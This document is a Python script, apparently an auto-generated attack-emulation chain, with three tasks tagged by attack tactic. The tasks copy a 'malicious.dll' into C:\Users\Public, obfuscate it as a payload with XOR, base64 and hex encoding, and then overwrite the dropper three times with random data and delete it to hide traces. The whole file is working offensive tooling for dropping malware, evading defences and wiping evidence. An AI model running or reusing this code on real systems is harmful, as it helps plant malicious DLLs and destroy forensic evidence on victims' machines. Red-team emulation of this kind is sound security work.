#!/usr/bin/env python3
import sys, json, time, os, shutil, base64
from typing import Dict, Any

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    dll_name = "malicious.dll"
    source_dll_path = os.path.join(os.getcwd(), dll_name)
    target_dir = "C:\\Users\\Public\\"
    dll_path = os.path.join(target_dir, dll_name)
    
    try:
        shutil.copy(source_dll_path, target_dir)
        dll_loaded = os.path.exists(dll_path)
        result = {'dll_path': dll_path if dll_loaded else None}
        return {'success': dll_loaded, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        result = {'dll_path': None}
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        dll_path = input_data.get('dll_path', '')
        
        with open(dll_path, 'rb') as f:
            payload = f.read()
        
        xor_key = b'\x3f'
        xored_payload = bytes(b ^ xor_key[0] for b in payload)
        encoded_data = base64.b64encode(xored_payload)
        encoded_data_hex = encoded_data.hex()
        
        result = {'encoded_data': encoded_data_hex}
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'encoded_data': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        dll_path = input_data.get('dll_path', '')
        
        if os.path.exists(dll_path):
            file_size = os.path.getsize(dll_path)
            
            with open(dll_path, 'wb') as f:
                for _ in range(3):
                    f.write(os.urandom(file_size))
                    f.flush()
                    os.fsync(f.fileno())
            
            os.remove(dll_path)
        
        result = {'success': True}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except FileNotFoundError:
        result = {'success': True}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Place Malicious DLL [execution] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Place Malicious DLL): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Place Malicious DLL): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Encode Payload [defense-evasion] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Encode Payload): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Encode Payload): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Delete Dropper File [defense-evasion] ──
    try:
        r = task_T3(outputs.get('T1', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Delete Dropper File): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Delete Dropper File): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))